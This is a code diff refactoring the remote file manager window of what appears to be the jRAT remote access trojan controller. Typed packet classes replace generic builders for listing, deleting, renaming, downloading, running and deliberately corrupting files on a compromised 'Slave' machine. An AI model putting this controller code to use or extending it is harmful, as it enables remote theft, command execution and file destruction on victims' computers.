@@ -50,8 +50,14 @@ import com.redpois0n.SendFile;
 import com.redpois0n.Slave;
 import com.redpois0n.io.FileSystem;
 import com.redpois0n.listeners.DirListener;
-import com.redpois0n.packets.OutgoingHeader;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet15ListFiles;
+import com.redpois0n.packets.outgoing.Packet16DeleteFile;
+import com.redpois0n.packets.outgoing.Packet21GetFile;
+import com.redpois0n.packets.outgoing.Packet38RunCommand;
+import com.redpois0n.packets.outgoing.Packet43CreateDirectory;
+import com.redpois0n.packets.outgoing.Packet47RenameFile;
+import com.redpois0n.packets.outgoing.Packet64FileHash;
+import com.redpois0n.packets.outgoing.Packet70CorruptFile;
 import com.redpois0n.settings.FileBookmarks;
 import com.redpois0n.ui.components.Table;
 import com.redpois0n.ui.renderers.table.FileViewTableRenderer;
@@ -194,7 +200,7 @@ public class FrameRemoteFiles extends BaseFrame {
 		driveComboBox = new JComboBox<String>();
 		driveComboBox.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				sl.addToSendQueue(new PacketBuilder(OutgoingHeader.LIST_FILES, new String[] { driveComboBox.getSelectedItem().toString() }));
+				sl.addToSendQueue(new Packet15ListFiles(driveComboBox.getSelectedItem().toString()));
 			}
 		});
 		DefaultComboBoxModel<String> comboModel = (DefaultComboBoxModel<String>) driveComboBox.getModel();
@@ -221,13 +227,13 @@ public class FrameRemoteFiles extends BaseFrame {
 					while (model.getRowCount() > 0) {
 						model.removeRow(0);
 					}
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.LIST_FILES, new String[] { "" }));
+					sl.addToSendQueue(new Packet15ListFiles(""));
 				} else {
 					txtDir.setText(txtDir.getText().substring(0, txtDir.getText().lastIndexOf(sep)));
 					while (model.getRowCount() > 0) {
 						model.removeRow(0);
 					}
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.LIST_FILES, new String[] { txtDir.getText() }));
+					sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
 				}
 			}
 		});
@@ -240,7 +246,7 @@ public class FrameRemoteFiles extends BaseFrame {
 				while (model.getRowCount() > 0) {
 					model.removeRow(0);
 				}
-				sl.addToSendQueue(new PacketBuilder(OutgoingHeader.LIST_FILES, new String[] { txtDir.getText() }));
+				sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
 			}
 		});
 		btnRefresh.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/refresh.png")));
@@ -254,7 +260,7 @@ public class FrameRemoteFiles extends BaseFrame {
 				if (files != null) {
 					for (String file : files) {
 						if (Util.yesNo("Confirm", "Confirm deleting " + file)) {
-							sl.addToSendQueue(new PacketBuilder(OutgoingHeader.DELETE_FILE, new String[] { file }));
+							sl.addToSendQueue(new Packet16DeleteFile(file));
 						}
 					}
 				}
@@ -272,7 +278,7 @@ public class FrameRemoteFiles extends BaseFrame {
 					return;
 				}
 				foldername = foldername.trim();
-				sl.addToSendQueue(new PacketBuilder(OutgoingHeader.FILE_CREATE_DIRECTORY, new String[] { txtDir.getText(), foldername }));
+				sl.addToSendQueue(new Packet43CreateDirectory(txtDir.getText(), foldername));
 			}
 		});
 		btnNewFolder.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/new_folder.png")));
@@ -290,7 +296,7 @@ public class FrameRemoteFiles extends BaseFrame {
 					while (model.getRowCount() > 0) {
 						model.removeRow(0);
 					}
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.LIST_FILES, new String[] { txtDir.getText() }));
+					sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
 				}
 			}
 		});
@@ -428,7 +434,7 @@ public class FrameRemoteFiles extends BaseFrame {
 						while (model.getRowCount() > 0) {
 							model.removeRow(0);
 						}
-						sl.addToSendQueue(new PacketBuilder(OutgoingHeader.LIST_FILES, new String[] { txtDir.getText() }));
+						sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
 					}
 				}
 			}
@@ -472,7 +478,7 @@ public class FrameRemoteFiles extends BaseFrame {
 				String[] files = Util.getFiles(table.getSelectedRows(), model);
 				if (files != null) {
 					for (String file : files) {
-						sl.addToSendQueue(new PacketBuilder(OutgoingHeader.RUN_COMMAND, file));
+						sl.addToSendQueue(new Packet38RunCommand(file));
 					}
 				}
 			}
@@ -573,7 +579,7 @@ public class FrameRemoteFiles extends BaseFrame {
 					return;
 				}
 				foldername = foldername.trim();
-				sl.addToSendQueue(new PacketBuilder(OutgoingHeader.FILE_CREATE_DIRECTORY, new String[] { txtDir.getText(), foldername }));
+				sl.addToSendQueue(new Packet43CreateDirectory(txtDir.getText(), foldername));
 			}
 		});
 		popupMenu.add(mntmNewFolder);
@@ -587,7 +593,7 @@ public class FrameRemoteFiles extends BaseFrame {
 				if (files != null) {
 					for (String file : files) {
 						if (Util.yesNo("Confirm", "Confirm deleting " + file)) {
-							sl.addToSendQueue(new PacketBuilder(OutgoingHeader.DELETE_FILE, file));
+							sl.addToSendQueue(new Packet16DeleteFile(file));
 						}
 					}
 				}
@@ -606,7 +612,7 @@ public class FrameRemoteFiles extends BaseFrame {
 					if (result == null) {
 						return;
 					}
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.RENAME_FILE, new String[] { file, result.trim() }));
+					sl.addToSendQueue(new Packet47RenameFile(file, result.trim()));
 				}
 			}
 		});
@@ -619,7 +625,7 @@ public class FrameRemoteFiles extends BaseFrame {
 			public void actionPerformed(ActionEvent arg0) {
 				String file = model.getValueAt(table.getSelectedRow(), 0).toString();
 				if (file != null) {
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.MD5_FILE, file));
+					sl.addToSendQueue(new Packet64FileHash(file));
 					waitingForMd5 = true;
 				}
 			}
@@ -631,7 +637,7 @@ public class FrameRemoteFiles extends BaseFrame {
 			public void actionPerformed(ActionEvent arg0) {
 				String file = model.getValueAt(table.getSelectedRow(), 0).toString();
 				if (file != null) {
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.CORRUPT_FILE, file));
+					sl.addToSendQueue(new Packet70CorruptFile(file));
 				}
 			}
 		});
@@ -715,7 +721,7 @@ public class FrameRemoteFiles extends BaseFrame {
 					while (model.getRowCount() > 0) {
 						model.removeRow(0);
 					}
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.LIST_FILES, new String[] { txtDir.getText() }));
+					sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
 				}
 			}
 		});
@@ -731,13 +737,13 @@ public class FrameRemoteFiles extends BaseFrame {
 					while (model.getRowCount() > 0) {
 						model.removeRow(0);
 					}
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.LIST_FILES, new String[] { "" }));
+					sl.addToSendQueue(new Packet15ListFiles(""));
 				} else {
 					txtDir.setText(txtDir.getText().substring(0, txtDir.getText().lastIndexOf("\\")));
 					while (model.getRowCount() > 0) {
 						model.removeRow(0);
 					}
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.LIST_FILES, new String[] { txtDir.getText() }));
+					sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
 				}
 			}
 		});
@@ -751,7 +757,7 @@ public class FrameRemoteFiles extends BaseFrame {
 				while (model.getRowCount() > 0) {
 					model.removeRow(0);
 				}
-				sl.addToSendQueue(new PacketBuilder(OutgoingHeader.LIST_FILES, new String[] { txtDir.getText() }));
+				sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
 			}
 		});
 		mntmRefresh.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/refresh.png")));
@@ -780,7 +786,7 @@ public class FrameRemoteFiles extends BaseFrame {
 						try {
 							Desktop.getDesktop().open(new File(val));
 						} catch (Exception e1) {
-							// e1.printStackTrace();
+							e1.printStackTrace();
 						}
 					}
 				}
@@ -810,7 +816,7 @@ public class FrameRemoteFiles extends BaseFrame {
 					while (model.getRowCount() > 0) {
 						model.removeRow(0);
 					}
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.LIST_FILES, new String[] { txtDir.getText() }));
+					sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
 				}
 			};
 
@@ -846,7 +852,7 @@ public class FrameRemoteFiles extends BaseFrame {
 				FileData data = new FileData(slave);
 				data.setLocalFile(f.getSelectedFile());
 
-				slave.addToSendQueue(new PacketBuilder(OutgoingHeader.GET_FILE, new String[] { file }));
+				slave.addToSendQueue(new Packet21GetFile(file));
 				for (int i = 1; i < rows.length; i++) {
 					int row = rows[i];
 					if (model.getValueAt(row, 1).toString().length() > 0) {
@@ -868,7 +874,7 @@ public class FrameRemoteFiles extends BaseFrame {
 				if (model.getValueAt(row, 1).toString().length() > 0) {
 					FileData data = new FileData(slave);
 					data.setLocalFile(f.getSelectedFile());
-					slave.addToSendQueue(new PacketBuilder(OutgoingHeader.GET_FILE, new String[] { file }));
+					slave.addToSendQueue(new Packet21GetFile(file));
 				}
 			}
 		}
